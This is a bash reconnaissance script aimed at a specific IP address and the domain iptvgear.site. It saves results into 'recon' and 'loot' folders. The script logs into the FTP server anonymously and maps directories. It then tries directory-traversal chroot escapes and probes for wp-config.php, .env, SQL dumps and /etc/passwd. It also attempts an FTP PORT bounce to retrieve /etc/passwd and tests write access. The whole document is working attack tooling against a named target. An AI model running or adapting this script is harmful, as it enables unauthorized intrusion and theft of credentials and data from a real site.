#!/bin/bash
HOST="103.160.107.175"
PORT="6969"
OUTDIR="/home/ubuntu/iptvgear.site"
MAP="$OUTDIR/recon/active/ftp_filesystem.txt"
CREDS="$OUTDIR/loot/ftp_creds.txt"
FILES="$OUTDIR/loot/ftp_files.md"

echo "================================================" | tee -a "$MAP"
echo "FTP Enum - $HOST:$PORT - $(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "$MAP"
echo "================================================" | tee -a "$MAP"

run_cmds() {
    local cmds="$1"
    local label="$2"
    echo "" | tee -a "$MAP"
    echo "--- $label ---" | tee -a "$MAP"
    # Use printf to pipe commands to ftp
    printf "%s\nquit\n" "$cmds" | ftp -n "$HOST" "$PORT" 2>&1 | tee -a "$MAP"
}

# Login anonymously
ANON="USER anonymous
PASS anonymous@test.com"

# === 1. Map directories via STAT ===
PATHS=(
    "/"
    "/www"
    "/www/html"
    "/www/iptvgear.site"
    "/public_html"
    "/home"
    "/home/iptvgear"
    "/home/iptvgear/public_html"
    "/home/iptvgear.site"
    "/var"
    "/var/www"
    "/var/www/html"
    "/var/www/vhosts"
    "/var/www/vhosts/iptvgear.site"
    "/var/www/vhosts/iptvgear.site/httpdocs"
    "/usr"
    "/usr/local"
    "/usr/local/www"
    "/usr/local/apache"
    "/etc"
    "/etc/httpd"
    "/etc/apache2"
)

echo "" | tee -a "$MAP"
echo "########################################" | tee -a "$MAP"
echo "# 1. DIRECTORY MAPPING VIA CWD + STAT #" | tee -a "$MAP"
echo "########################################" | tee -a "$MAP"

for p in "${PATHS[@]}"; do
    echo "" | tee -a "$MAP"
    echo "--- CWD $p ---" | tee -a "$MAP"
    printf "%s\nCWD %s\nSTAT\nquit\n" "$ANON" "$p" | ftp -n "$HOST" "$PORT" 2>&1 | tee -a "$MAP"
done

# === 2. Chroot escape attempts ===
echo "" | tee -a "$MAP"
echo "########################################" | tee -a "$MAP"
echo "# 2. CHROOT ESCAPE ATTEMPTS            #" | tee -a "$MAP"
echo "########################################" | tee -a "$MAP"

ESCAPE_PATHS=(
    ".."
    "../.."
    "../../../"
    "../../../.."
    "../../../../.."
    "../../../../../.."
    "/etc"
    "/var/www"
)

for p in "${ESCAPE_PATHS[@]}"; do
    echo "" | tee -a "$MAP"
    echo "--- CWD $p ---" | tee -a "$MAP"
    printf "%s\nCWD %s\nSTAT\nquit\n" "$ANON" "$p" | ftp -n "$HOST" "$PORT" 2>&1 | tee -a "$MAP"
done

# === 3. MDTM + SIZE checks ===
echo "" | tee -a "$MAP"
echo "########################################" | tee -a "$MAP"
echo "# 3. MDTM + SIZE CHECKS               #" | tee -a "$MAP"
echo "########################################" | tee -a "$MAP"

CHECK_FILES=(
    "wp-config.php"
    "/etc/passwd"
    "/home/iptvgear/public_html/wp-config.php"
    "/var/www/html/wp-config.php"
    "/var/www/vhosts/iptvgear.site/httpdocs/wp-config.php"
    "/www/iptvgear.site/wp-config.php"
    ".env"
    "config.php"
    "configuration.php"
    "db.php"
    "database.php"
    "backup.sql"
    "dump.sql"
    ".htaccess"
    ".gitignore"
    "composer.json"
)

for f in "${CHECK_FILES[@]}"; do
    printf "%s\nMDTM %s\nSIZE %s\nquit\n" "$ANON" "$f" "$f" | ftp -n "$HOST" "$PORT" 2>&1 | tee -a "$MAP"
done

# === 4. PORT mode test ===
echo "" | tee -a "$MAP"
echo "########################################" | tee -a "$MAP"
echo "# 4. PORT MODE TEST                   #" | tee -a "$MAP"
echo "########################################" | tee -a "$MAP"
printf "%s\nPORT 127,0,0,1,0,21\nRETR /etc/passwd\nquit\n" "$ANON" | ftp -n "$HOST" "$PORT" 2>&1 | tee -a "$MAP"

# === 5. LIST via STAT in root ===
echo "" | tee -a "$MAP"
echo "########################################" | tee -a "$MAP"
echo "# 5. DETAILED LIST IN ROOT (STAT)     #" | tee -a "$MAP"
echo "########################################" | tee -a "$MAP"
printf "%s\nSTAT\nquit\n" "$ANON" | ftp -n "$HOST" "$PORT" 2>&1 | tee -a "$MAP"

# === 6. Write permission test ===
echo "" | tee -a "$MAP"
echo "########################################" | tee -a "$MAP"
echo "# 6. WRITE PERMISSION TESTS           #" | tee -a "$MAP"
echo "########################################" | tee -a "$MAP"
printf "%s\nSITE MKDIR test123\nSITE CHMOD 777 test\nDELE test123\nRMD test123\nquit\n" "$ANON" | ftp -n "$HOST" "$PORT" 2>&1 | tee -a "$MAP"

echo "" | tee -a "$MAP"
echo "================================================" | tee -a "$MAP"
echo "ENUMERATION COMPLETE" | tee -a "$MAP"
echo "================================================" | tee -a "$MAP"